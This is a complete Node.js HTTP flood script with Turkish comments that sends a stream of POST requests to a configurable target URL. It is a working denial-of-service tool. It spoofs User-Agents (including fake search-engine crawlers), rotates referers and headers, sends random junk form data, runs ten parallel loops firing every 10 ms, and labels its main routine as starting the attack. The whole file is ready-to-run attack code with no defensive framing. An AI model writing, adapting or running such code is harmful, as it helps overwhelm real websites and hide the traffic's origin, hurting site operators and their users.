const http = require('http');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto');

const targetUrl = 'http://example.com'; // Hedef URL
const duration = 10000; // Süre (ms)
const threadCount = 10; // Thread sayısı

const url = new URL(targetUrl);
const protocol = url.protocol === 'https:' ? https : http;

// Rastgele değerlerden oluşan listeler
const platforms = ['Macintosh', 'Windows', 'X11'];
const macSystems = ['68K', 'PPC', 'Intel Mac OS X'];
const windowsSystems = [
  'Win3.11',
  'WinNT3.51',
  'WinNT4.0',
  'Windows NT 5.0',
  'Windows NT 5.1',
  'Windows NT 5.2',
  'Windows NT 6.0',
  'Windows NT 6.1',
  'Windows NT 6.2',
  'Win 9x 4.90',
  'Windows XP',
  'Windows 7',
  'Windows 8',
  'Windows NT 10.0; Win64; x64'
];
const linuxSystems = ['Linux i686', 'Linux x86_64'];
const browsers = ['chrome', 'spider', 'ie'];
const browserTokens = ['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'];
const spiders = [
  'AdsBot-Google (http://www.google.com/adsbot.html)',
  'Baiduspider (http://www.baidu.com/search/spider.htm)',
  'FeedFetcher-Google (http://www.google.com/feedfetcher.html)',
  'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
  'Googlebot-Image/1.0',
  'Googlebot-News',
  'Googlebot-Video/1.0'
];
const referers = [
  'https://www.google.com/search?q=',
  'https://check-host.net/',
  'https://www.facebook.com/',
  'https://www.youtube.com/',
  'https://www.fbi.com/'
];

// Rastgele User-Agent oluşturucu
function generateUserAgent() {
  const platform = platforms[Math.floor(Math.random() * platforms.length)];
  let os = '';
  if (platform === 'Macintosh') {
    os = macSystems[Math.floor(Math.random() * macSystems.length)];
  } else if (platform === 'Windows') {
    os = windowsSystems[Math.floor(Math.random() * windowsSystems.length)];
  } else if (platform === 'X11') {
    os = linuxSystems[Math.floor(Math.random() * linuxSystems.length)];
  }

  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  if (browser === 'chrome') {
    const webkit = Math.floor(Math.random() * (599 - 500) + 500);
    const version = `${Math.floor(Math.random() * 100)}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 1000)}`;
    return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
  } else if (browser === 'ie') {
    const version = `${Math.floor(Math.random() * 100)}.0`;
    const engine = `${Math.floor(Math.random() * 100)}.0`;
    const token = Math.random() > 0.5 ? `${browserTokens[Math.floor(Math.random() * browserTokens.length)]}; ` : '';
    return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; ${token}Trident/${engine})`;
  } else {
    return spiders[Math.floor(Math.random() * spiders.length)];
  }
}

// Rastgele başlıklar oluşturucu
function generateRandomHeaders() {
  return {
    'Accept': [
      'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
      'text/plain;q=0.8,image/png,*/*;q=0.5'
    ][Math.floor(Math.random() * 3)],
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': ['gzip, deflate', 'gzip'][Math.floor(Math.random() * 2)],
    'User-Agent': generateUserAgent(),
    'Referer': referers[Math.floor(Math.random() * referers.length)],
    'X-Custom-Header': crypto.randomBytes(6).toString('hex')
  };
}

// Rastgele POST verisi üretme fonksiyonu
function generateRandomPostData() {
  return JSON.stringify({
    username: crypto.randomBytes(8).toString('hex'),
    email: crypto.randomBytes(12).toString('hex') + '@example.com',
    message: crypto.randomBytes(16).toString('hex')
  });
}

// İstek gönderme fonksiyonu
function sendRequest() {
  const postData = generateRandomPostData();
  const headers = generateRandomHeaders();
  const options = {
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname,
    method: 'POST',
    headers: {
      ...headers,
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = protocol.request(options, (res) => {
    res.on('data', () => {});
  });

  req.on('error', (error) => {
    console.error('');
  });

  req.write(postData);
  req.end();
}

// Saldırıyı başlatma fonksiyonu
function startFlooding() {
  const endTime = Date.now() + duration;

  for (let i = 0; i < threadCount; i++) {
    (function flood() {
      if (Date.now() > endTime) {
        return; // Süre dolduysa dur
      } else {
        sendRequest();
        setTimeout(flood, 10); // 10 ms bekle ve tekrar gönder
      }
    })();
  }
}

startFlooding();
console.log(`Flooding ${targetUrl} with POST requests for ${duration} ms using ${threadCount} threads.`);